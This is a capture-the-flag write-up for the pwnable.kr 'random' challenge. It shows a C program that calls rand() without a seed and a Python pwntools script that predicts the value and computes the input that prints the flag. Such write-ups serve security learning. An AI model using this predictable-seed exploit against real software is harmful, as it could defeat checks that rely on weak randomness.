# random

By connecting through ssh to the server we've been given three files as shown below. These are the
compiled binary, the source code and of course the flag.
### Disclaimer!

I changed the original flag with the custom flag "Shad3 pwnned this" as well as the correct input to the binary to "*******", it's better to exploit it yourself,than just copy it :P.

## Enumeration
```bash
shad3@zeroday:~/Desktop/Security/CTF/pwnable.kr/random$ ssh random@pwnable.kr -p2222 
random@pwnable.kr's password: 
 ____  __    __  ____    ____  ____   _        ___      __  _  ____  
|    \|  |__|  ||    \  /    ||    \ | |      /  _]    |  |/ ]|    \ 
|  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  ' / |  D  )
|   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    / 
|  |  |  `  '  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \|    \ 
|  |   \      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \
|__|    \_/\_/  |__|__||__|__||_____||_____||_____||__||__|\_||__|\_|
                                                                     
- Site admin : daehee87@gatech.edu
- IRC : irc.netgarage.org:6667 / #pwnable.kr
- Simply type "irssi" command to join IRC now
- files under /tmp can be erased anytime. make your directory under /tmp
- to use peda, issue `source /usr/share/peda/peda.py` in gdb terminal
You have mail.
random@pwnable:~$ ls
flag  random  random.c
```

Let's start analysing the source code to understand what this challenge is about.
```c
#include <stdio.h>

int main(){
        unsigned int random;
        random = rand();        // random value!

        unsigned int key=0;
        scanf("%d", &key);

        if( (key ^ random) == 0xdeadbeef ){
                printf("Good!\n");
                system("/bin/cat flag");
                return 0;
        }

        printf("Wrong, maybe you should try 2^32 cases.\n");
        return 0;
}
```
That's a small programm generating a **pseudorandom** unsigned integer, then XOR's that number with
a key that gets as input from stdin, and compaires the result with the value 0xdeadbeef, if they are equal a flag pops up :P.

By reading the linux manual for the rand() function we understand that when no specific seed is provided using the srand() function the rand() will always be seeded with a value of 1. 
```bash
DESCRIPTION
       The random() function uses a nonlinear additive feedback random number generator employing a default table of size 31 long integers to return
       successive pseudo-random numbers in the range from 0 to RAND_MAX.  The period of this random number generator is  very  large,  approximately
       16 * ((2^31) - 1).

       The  srandom()  function  sets  its  argument  as  the  seed  for a new sequence of pseudo-random integers to be returned by random().  These
       sequences are repeatable by calling srandom() with the same seed value.  If no seed value is provided, the random() function is automatically
       seeded with a value of 1.
```

## Script
With that being said we understand that the output of rand() will always be the same. So let's write a simple python script, to give us the input that we have to give to the the programm to get the flag.

```python 
import math
from ctypes import CDLL
from pwn import *

def get_Random():
	return libc.rand()


libc = CDLL('libc.so.6')
libc.srand(1)

payload = str(get_Random() ^ 0xdeadbeef)

print ("To get the flag on the server please submit the following input to the programm: " + payload)
print ("Checking locally!!")
p = process('./random')
p.sendline(payload)
p.interactive()
```
What this script does is that it imports the c functions in python using the ctypes library.
It generates the exact same value that the system will generate calling the rand() function, and then xor's the output with deadbeef
that returns the input that we have to give, XORing 2 values out of input, output and key in that type of encryption will always return the third. Lets compile the c programm locally and run our script to check if it works 


```bash
shad3@zeroday:~/Desktop/Security/CTF/pwnable.kr/random$ gcc random.c -o random
shad3@zeroday:~/Desktop/Security/CTF/pwnable.kr/random$ python exploit.py 
To get the flag on the server please submit the following input to the programm: **********
Checking locally!!
[+] Starting local process './random': pid 24051
[*] Switching to interactive mode
Good!
Shad3 pwnned this!
[*] Process './random' stopped with exit code 0 (pid 24051)
[*] Got EOF while reading in interactive
```
And we got our flag! :). Now all you have to do is submit the output of the programm to the binary on the server. If it's not working which is highly unlinkely that's because the implementation of rand() function differs to your system than to the one on the server. What you have to do in that case is modify the script a bit (try this yourself!) and run it on the server. For me it works just fine!